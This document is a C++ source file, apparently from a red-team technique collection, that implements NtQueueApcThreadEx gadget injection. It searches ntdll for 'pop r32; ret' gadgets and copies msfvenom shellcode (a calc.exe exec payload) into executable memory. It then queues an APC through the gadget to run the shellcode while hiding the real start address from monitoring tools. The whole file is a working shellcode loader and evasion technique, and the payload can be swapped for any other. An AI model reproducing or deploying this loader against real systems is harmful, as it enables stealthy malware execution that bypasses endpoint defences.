/*
* Title: NtQueueApcThreadEx Gadget Injection
* Resources:
*	- https://github.com/LloydLabs/ntqueueapcthreadex-ntdll-gadget-injection
*/
#include <Windows.h>
#include "Nt.hpp"
#include "NtQueueApcThreadExGadgetInjection.hpp"

BOOL ValidGadget(PBYTE pAddr) {
	// Find 'pop r32; ret' gadget 
	return (*pAddr != 0x5C && (*pAddr & 0xF0) == 0x50) && *(pAddr + 1) == 0xC3;
}

LPVOID FindGadget(HANDLE hProcess, LPCWSTR lpModuleName) {
	HMODULE hModule = GetModuleHandle(lpModuleName);
	if (!hModule) return nullptr;
	
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)pDosHeader + pDosHeader->e_lfanew);
	PIMAGE_SECTION_HEADER pFirstSecHeader = IMAGE_FIRST_SECTION(pNtHeaders);

	LPVOID lpGadgets[MAX_GADGETS] = {};
	RtlSecureZeroMemory(lpGadgets, sizeof(lpGadgets));

	DWORD dwGadgetCount = 0;
	for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER pCurrentSecHeader = (PIMAGE_SECTION_HEADER)((PBYTE)pFirstSecHeader + (IMAGE_SIZEOF_SECTION_HEADER * i));
		
		// Find code (commonly '.text') and executable section.
		if ((pCurrentSecHeader->Characteristics & IMAGE_SCN_CNT_CODE) == IMAGE_SCN_CNT_CODE &&
			(pCurrentSecHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) == IMAGE_SCN_MEM_EXECUTE) {

			LPBYTE lpSecBase = (LPBYTE)hModule + pCurrentSecHeader->VirtualAddress;
			LPBYTE lpSecEnd = (LPBYTE)lpSecBase + pCurrentSecHeader->Misc.VirtualSize;

			for (PBYTE pCurrentAddr = lpSecBase; pCurrentAddr < (lpSecEnd - 1); pCurrentAddr++) {
				if (!ValidGadget(pCurrentAddr))
					continue;

				lpGadgets[dwGadgetCount++] = pCurrentAddr;
				if (dwGadgetCount == MAX_GADGETS)
					break;
			}
		}
	}

	// Extract a gadget randomly from all found gadgets
	return lpGadgets[RANDOM_NUM(0, dwGadgetCount)];
}

BOOL NtQueueApcThreadExGadgetInjection() {
	// Shellcode generated by `msfvenom -p windows/x64/exec CMD=calc.exe -f c`
	unsigned char shellcode[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
		"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
		"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

	// Resolve functions.
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	if (!hNtdll) return FALSE;
	_NtQueueApcThreadEx ntQueueApcThreadEx = reinterpret_cast<_NtQueueApcThreadEx>(GetProcAddress(hNtdll, "NtQueueApcThreadEx"));
	if (!ntQueueApcThreadEx) return FALSE;
	_NtTestAlert ntTestAlert = reinterpret_cast<_NtTestAlert>(GetProcAddress(hNtdll, "NtTestAlert"));
	if (!ntTestAlert) return FALSE;

	// Write shellcode to allocated memory.
	LPVOID lpShellcode = VirtualAlloc(nullptr, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!lpShellcode) return FALSE;
	RtlCopyMemory(lpShellcode, shellcode, sizeof(shellcode));

	// Find 'pop r32; ret' gadget within ntdll, and choose random one from them.
	LPVOID lpGadget = FindGadget(GetCurrentProcess(), L"ntdll.dll");
	if (!lpGadget) {
		VirtualFree(lpShellcode, 0, MEM_RELEASE);
		return FALSE;
	}

	// Queue alert with the gadget.
	NTSTATUS status = ntQueueApcThreadEx(
		GetCurrentThread(),
		nullptr,
		(PPS_APC_ROUTINE)lpGadget,
		lpShellcode, // The gadget returns the shellcode pointer.
		nullptr,
		nullptr
	);
	if (NT_SUCCESS(status)) {
		ntTestAlert();
	}

	VirtualFree(lpShellcode, 0, MEM_RELEASE);

	return TRUE;
}
